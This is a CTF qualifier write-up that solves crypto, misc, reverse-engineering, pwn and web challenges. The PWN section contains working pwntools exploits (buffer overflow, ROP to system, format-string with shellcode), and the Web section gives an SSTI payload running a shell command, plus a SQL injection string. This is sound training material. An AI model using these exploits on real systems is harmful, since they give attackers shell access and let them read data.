# Writeup for 2022 Summer Qualifier Exam

The challenge number is 17 in total (with 1 hidden PWN challenge from the last year). All the challenges are simple and easy, modified from the previous competition challenges I've solved.

| Category | Quantity | Link                |
| -------- | -------- | ------------------- |
| Crypto   | 3        | [Writeups](#Crypto) |
| Misc     | 2        | [Writeups](#Misc)   |
| PWN      | 4        | [Writeups](#PWN)    |
| Re       | 3        | [Writeups](#Re)     |
| Web      | 4        | [Writeups](#Web)    |

## Crypto

All the challenges are from [DiceCTF 2022 @Hope](https://hope.dicega.ng/challs). Currently, environment from the original website is down. We would hold those amazing challenges for further studies.

### 超下头的签到

```
今日份打工人营业啦💝 毫无抵抗力 还是去打CTF了 啥也不是 哒哒哒 这家的CTF超赞的❓❓❓介个小蛋糕也真下头⁉️⁉️⁉️srds 路边捡到了一分钱 预警⚠️ 啦啦啦 星星月亮和我都要睡啦🌸

谜语人的暗语: 575d55524a5c50586b46595d6e5a555b6e5f505f6b4c44555f6e575d446b55546b5f58556e43555b6e56506e5e5c506b43545a6a5c515f4c
据说是密钥: 114514
```

The description isn't related to the challenge. The key point is the last half of the description. A string of hex, and some strange digits.

It's easy to think about the `xor` encryption. Very simple, use the `114514` (in escaped string) as a key, decode the given cipher:

```
flag{hai_shi_kan_kan_yuan_chu_de_jia_ran_ba_jia_ren_men}
```

### 超迷你的RSA

```
c=32949
n=64741
e=42667
```

Very simple RSA with small N. Factor N into 101 and 641.

```python
>>> from Crypto.Util.number import *
>>> p = 101
>>> q = 641
>>> c = 32949
>>> e = 42667
>>> phi = (p-1)*(q-1)
>>> d = inverse(e,phi)
>>> pow(c,d,p*q)
18429
```

Use the password to open the compress file, find the flag.

```
flag{gr34t_m1nds_th1nk_4l1ke}
```

### 超保密的AES算法

ECB mode AES encryption. The server gives out the hex ciphertext of flag once, then asks us to input a hex string, then prints the cipher text of the string.

This is a CPA scenario. ECB mode can't defense from CPA. We use 0x00 string to reveal the key:

```
> b0bcf580640b080efd0a25dd77b1e152b2e8b9d3285a531bff0b718c6fabe053e4b6a6832e505301ac4416ec449a8267
< 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
> d6d094e71f686a369e3910ea429c8461c6c084f70f787a268e2900fa528c9471
```

We now know the key, use this key to decrypt flag:

```
flag{cb8c3575-e3d8-4729-a2af-7d22f2d18972}
```

## Misc

All the challenges are modified from [ctf.show 七夕杯](https://ctf.show/). 

### 签到

Gives a graph, the content doesn't matter. Use any hex editor or simply type `strings` command, and we can find the flag in the tail of the file.

### 教皇的密码

The origin challenge is called `海盗的密码`. The ip region changed to Vatican in this challenge. Thus, we need to brute force all the IPs from Vatican.

```
185.17.220.0	185.17.223.255	1024
185.152.68.0	185.152.71.255	1024
193.43.102.0	193.43.103.255	512
212.77.0.0	212.77.31.255	8192
```

The password is `212.77.31.255`. Open the compressed file to get the flag,

## PWN

All the challenges are from XCTF's recent competitions.

### 签到

Check the file properties first:

```
$ file 291721f42a044f50a2aead748d539df0
291721f42a044f50a2aead748d539df0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped
```

The main logic is simple, main prints `hello, world`, then calls `vulnerable_function`.

This function reads 0x200 bytes of data, and put them into 0x80 length buffer, which leads to a buffer overflow. Another useful function is `callsystem`, which gives us a shell.

The steps to solve:

1. Fill the first 0x80 bytes.
2. Overflow the 0x8 bytes of stack data useless.
3. Replace the next 4 bytes (return address) to `callsystem`.

```python
from pwn import * 
r = process("./app")
payload = 'A' * 0x88 + p64(0x00400596)
r.sendlineafter("Hello, World\n", payload)
r.interactive()
```

### 先别急

A little simple ROP challenge.

In this challenge, we don't have `callsystem` function any more. Instead, we need to find a `/bin/sh` string in the program.

Luckily, this challenge has `PIE disabled`. We can write libc address directly.

1. Overflow and jump to `system` function address.
2. Gives a `/bin/sh` string as parameter, and `0` as the second parameter.

```python
from pwn import *
system=0x08048320
shell=0x0804A024
r=process("./app")
payload='A'*(0x92)+p32(system)+p32(0)+p32(shell)
r.sendlineafter("Input:\n", payload)
r.interactive()
```

### 你猜我猜不猜

This challenge has Canary, NX, and PIE. We can't simple use ROP method because of the canary. However, the seed is on the stack as well. We can't reach the return address, but we can reach the seed integer.

1. Overflow 0x20 bytes and reach seed.
2. Replace the seed value.

Use the same seed, we can "predict" all the random numbers.

```python
from pwn import *
from ctypes import *

libc=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(0)

r=process("./app")
payload='A'*(0x20)+p32(0)
r.sendlineafter("Your name:", payload)

for i in range(10):
    num=str(libc.rand()%6+1)
    r.sendlineafter("Please input your guess number:", num)
r.interactive()
```

### 过关斩将

The first level: input "east" and win.

The second level: use the format string in `printf(&format, &format)`, we can reveal the address.

The last challenge gives us the control to input some codes, gives a shellcode.

```python
from pwn import *

shell=asm(shellcraft.amd64.linux.sh(),arch="amd64")
r=process("./app")
payload="%9x,%9x,%9x,%9x,%9x,%35x%n"
r.recvuntil("secret[0] is ")
addr=str(int(r.recvuntil("\n")[:-1],16))
r.sendlineafter("What should your character's name be:","ailx10")
r.sendlineafter("So, where you will go?east or up?:","east")
r.sendlineafter("go into there(1), or leave(0)?:","1")
r.sendlineafter("'Give me an address'",addr)
r.sendlineafter("And, you wish is:",payload)
r.sendlineafter("Wizard: I will help you! USE YOU SPELL",shell)

r.interactive()
```

## Re

All the challenges are modified from various provinces' CTF competitions: 西普杯京津冀信息安全挑战赛, 第五届山东省网络安全竞赛, 网鼎杯朱雀组.

### 真的是签到

Check the ELF, IDA would gives several integers in `main` function. Be aware of the data types are meaningless in assembly, those `integers` are in fact `strings`.

Mark the data as string, and we get the flag.

```
flag{4092849uio2jfklsj4k}
```

### 绝对在第五层

The program is written in MFC.

Use dynamic analysis, on the address `0x401743` we can find a comparison. The compared string is the key to show the flag.

```
008225C8 s1 = "123456"
00822668 s2 = "xxxxxXXXXXxxxx"
```

### 种树

In the main logic, the flag's bits are calculated from the path in a binary tree. We need to find the flag bits from the path in binary tree to the target string `zvzjyvosgnzkbjjjypjbjdvmsjjyvsjx` (modified in this challenge).

How to find the structure of the tree? We can use dynamic analysis, extract memory data from the execution.

```
[[‘y’, ‘0000’], [‘b’, ‘00010’], [‘q’, ‘00011’], [‘g’, ‘0010’], [‘f’, ‘0011’], [‘j’, ‘010’], [‘w’, ‘01100’], [‘p’, ‘01101’], [‘x’, ‘011100’], [‘d’, ‘0111010’], [‘i’, ‘0111011’], [‘k’, ‘01111’], [‘s’, ‘100’], [‘z’, ‘1010’], [‘n’, ‘1011’], [‘c’, ‘11000’], [‘t’, ‘110010’], [‘e’, ‘110011’], [‘h’, ‘1101’], [‘o’, ‘11100’], [‘l’, ‘1110100’], [‘u’, ‘11101010’], [‘r’, ‘111010110’], [‘a’, ‘111010111’], [‘m’, ‘111011’], [‘v’, ‘1111’]]
```

Find the path is simple, I won't describe here.

## Web

Challenges are from [DiceCTF 2022 @Hope](https://hope.dicega.ng/challs), nice competition!

### 简单的签到

Change the value of `admin` to `true` in cookie.

### 简单的模板

Simply use SSTI reversed version.

```python
}})')(daer.)"txt.galf/ppa/ tac"(nepop.)"so"(__tropmi__'(]'lave'[]'__snitliub__'[__slabolg__.__tini__.]331[)(__sessalcbus__.]0[__sesab__.__ssalc__.''{{
```

### 简单的注入

In the palindrome submit, we can start SQL injection attack.

The input should be a palindrome string.

```sqlite
'||(select flag from flags));--;))sgalfmorfgalftceles(||'
```

### 简单的序列

A simple GoLang unmarshal challenge. The GoLang's unmarshal doesn't care about the case of json, we can use upper case to bypass the filter.

```json
{
    "whaT_point":"that_point"
}
```

## Remarks

Hope you enjoy this competition, and take this practice as a learning progress.